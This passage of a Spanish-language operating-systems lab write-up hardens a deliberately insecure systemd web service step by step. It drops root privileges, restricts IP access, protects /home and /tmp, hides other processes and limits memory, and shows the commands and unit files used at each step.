        systemctl status insecure_service.service -l
Para detener el servicio:
        systemctl stop insecure_service.service
Para reiniciar el servicio:
        systemctl restart insecure_service.service
Para desinstalar el servicio:
        systemctl stop insecure_service.service
        rm /etc/systemd/system/insecure_service.service
        rm /opt/sistemasoperativos/insecure_service
        systemctl daemon-reload
```

##### b. Verifique que el servicio se está ejecutando con `systemctl status`.

```sh
so@so:~/codigo-para-practicas/practica5/insecure_service$ systemctl status
● so
    State: running
    Units: 245 loaded (incl. loaded aliases)
     Jobs: 0 queued
   Failed: 0 units
    Since: Fri 2025-06-06 20:50:41 -03; 9min ago
  systemd: 252.33-1~deb12u1
   CGroup: /
           ├─init.scope
           │ └─1 /sbin/init
           ├─system.slice
           │ ├─anacron.service
           │ │ └─505 /usr/sbin/anacron -d -q -s
           │ ├─cron.service
           │ │ └─506 /usr/sbin/cron -f
           │ ├─dbus.service
           │ │ └─507 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopi>
           │ ├─ifup@enp0s3.service
           │ │ └─442 dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp>
           │ ├─ifup@enp0s8.service
           │ │ └─382 dhclient -4 -v -i -pf /run/dhclient.enp0s8.pid -lf /var/lib/dhcp>
           │ ├─insecure_service.service
           │ │ └─1640 /opt/sistemasoperativos/insecure_service
           │ ├─ssh.service
           │ │ └─518 "sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups"
           │ ├─systemd-journald.service
           │ │ └─217 /lib/systemd/systemd-journald
lines 1-27
```

##### c. Verifique con qué UID se ejecuta el servicio usando `ps aux | grep insecure_service`.

```sh
so@so:~/codigo-para-practicas/practica5/insecure_service$ ps aux | grep insecure_service
root        1640  0.0  0.4 1232112 8244 ?        Ssl  20:58   0:00 /opt/sistemasoperativos/insecure_service
so          1803  0.0  0.1   6484  2128 pts/1    S+   21:01   0:00 grep insecure_service
```

El servicio se ejecuta con UID de root.

##### d. Abra localhost:8080 en el navegador y explore los links provistos por este servicio.

![Demo insecure_service en localhost:8080](https://i.imgur.com/zyyoWZq.png)

#### 5. Configure el servicio para que se ejecute con usuario y grupo no privilegiados (en Debian y derivados se llaman nouser y nogroup). Verifique con qué UID se ejecuta el servicio usando `ps aux | grep insecure_service`.

```ini
# SystemD unit to handle insecure_service service
[Unit]
Description=Insecure service
After=network.target

[Service]
Type=simple
Restart=Always
ExecStart=/opt/sistemasoperativos/insecure_service
User=nobody
Group=nogroup

[Install]
WantedBy=multi-user.target
```

Agrego esas dos líneas debajo de ExecStart en el archivo `/etc/systemd/system/insecure_service.service`. **NOTA**: User=nouser no me funcionó, tuve que usar User=**nobody**.

Luego ejecuto `systemctl daemon-reload`, `systemctl restart insecure_service.service` y chequeo el UID:

```sh
root@so:/etc/systemd/system# systemctl daemon-reload
root@so:/etc/systemd/system# systemctl restart insecure_service
so@so:~$ ps aux | grep insecure_service
nobody      3494  0.0  0.5 1232112 10356 ?       Ssl  21:15   0:00 /opt/sistemasoperativos/insecure_service
so          3868  0.0  0.1   6484  2136 pts/0    S+   21:19   0:00 grep insecure_service
```

Ahora el servicio se ejecuta con UID de nobody.

#### 6. Limite las IPs que pueden acceder al servicio para denegar todo por defecto y permitir solo conexiones de localhost (127.0.0.0/8).

```ini
# SystemD unit to handle insecure_service service
[Unit]
Description=Insecure service
After=network.target

[Service]
Type=simple
Restart=Always
ExecStart=/opt/sistemasoperativos/insecure_service
User=nobody
Group=nogroup
IPAddressAllow=127.0.0.0/8
IPAddressDeny=any

[Install]
WantedBy=multi-user.target
```

Agrego esas dos líneas debajo de Group en el archivo `/etc/systemd/system/insecure_service.service`.

```sh
root@so:/home/so# systemctl daemon-reload
root@so:/home/so# systemctl restart insecure_service
```

#### 7. Explore el directorio `/home` y el directorio `/tmp` usando el servicio y luego:

##### a. Reconfigurelo para que no pueda visualizar el contenido de `/home` y tenga su propio `/tmp` privado.

##### b. Recargue el servicio y verifique que estas restricciones surgieron efecto.

**Explorando el directorio `/home`**:

![Directorio /home](https://i.imgur.com/3lrHgcX.png)

**Explorando el directorio `/tmp`**:

![Directorio /tmp](https://i.imgur.com/3N9bsfD.png)

```ini
# SystemD unit to handle insecure_service service
[Unit]
Description=Insecure service
After=network.target

[Service]
Type=simple
Restart=Always
ExecStart=/opt/sistemasoperativos/insecure_service
User=nobody
Group=nogroup
IPAddressAllow=127.0.0.0/8
IPAddressDeny=any
ProtectHome=yes
PrivateTmp=true

[Install]
WantedBy=multi-user.target
```

Agrego esas dos líneas debajo de IPAddressDeny en el archivo `/etc/systemd/system/insecure_service.service` para que no se pueda ver el contenido de `/home` y para que tenga su propio `/tmp` privado.

```sh
root@so:/home/so# systemctl daemon-reload
root@so:/home/so# systemctl restart insecure_service
```

**Verificando restricción del directorio `/home`**:

![Directorio /home](https://i.imgur.com/Z6WQqr8.png)

**Verificando restricción del directorio `/tmp`**:

![Directorio /tmp](https://i.imgur.com/zo5UaXb.png)

#### 8. Limite el acceso a información de otros procesos por parte del servicio.

**Por defecto, podemos ver la información de todos los procesos**:

![Información de procesos sin restricción](https://i.imgur.com/AOzIZTk.png)

```ini
# SystemD unit to handle insecure_service service
[Unit]
Description=Insecure service
After=network.target

[Service]
Type=simple
Restart=Always
ExecStart=/opt/sistemasoperativos/insecure_service
User=nobody
Group=nogroup
IPAddressAllow=127.0.0.0/8
IPAddressDeny=any
ProtectHome=yes
PrivateTmp=true
ProtectProc=invisible

[Install]
WantedBy=multi-user.target
```

Agrego esa línea debajo de PrivateTmp en el archivo `/etc/systemd/system/insecure_service.service` para que no se oculte la información de los procesos que pertenecen a otros usuarios. Es decir, el servicio solo verá sus propios procesos y los procesos del mismo usuario.

```sh
root@so:/home/so# systemctl daemon-reload
root@so:/home/so# systemctl restart insecure_service
```

**Verificando la restricción**:

![Información de procesos con restricción](https://i.imgur.com/fUf0GSZ.png)

#### 9. Establezca un límite de 16M al uso de memoria del servicio e intente alocar más de esa memoria en la sección "Memoria" usando el link [Aumentar Reserva de Memoria](http://localhost:8080/mem/alloc).

**Por defecto, podemos reservarle al servicio tanta memoria como queramos, por ejemplo 32M**:

![Reserva de memoria sin restricción](https://i.imgur.com/Ktawpob.png)

```ini
# SystemD unit to handle insecure_service service
[Unit]
Description=Insecure service
After=network.target

[Service]
Type=simple
Restart=Always
ExecStart=/opt/sistemasoperativos/insecure_service
User=nobody
Group=nogroup
IPAddressAllow=127.0.0.0/8
IPAddressDeny=any
ProtectHome=yes
PrivateTmp=true
ProtectProc=invisible
MemoryAccounting=true
MemoryHigh=16M

[Install]
WantedBy=multi-user.target
```

Agrego esas dos líneas debajo de ProtectProc en el archivo `/etc/systemd/system/insecure_service.service` para que primero systemd pueda rastrear y aplicar límites de memoria, y además que si el servicio excede los 16M de memoria, el kernel intente reducirlo, pero sin matar al servicio.

```sh
root@so:/home/so# systemctl daemon-reload
root@so:/home/so# systemctl restart insecure_service
```
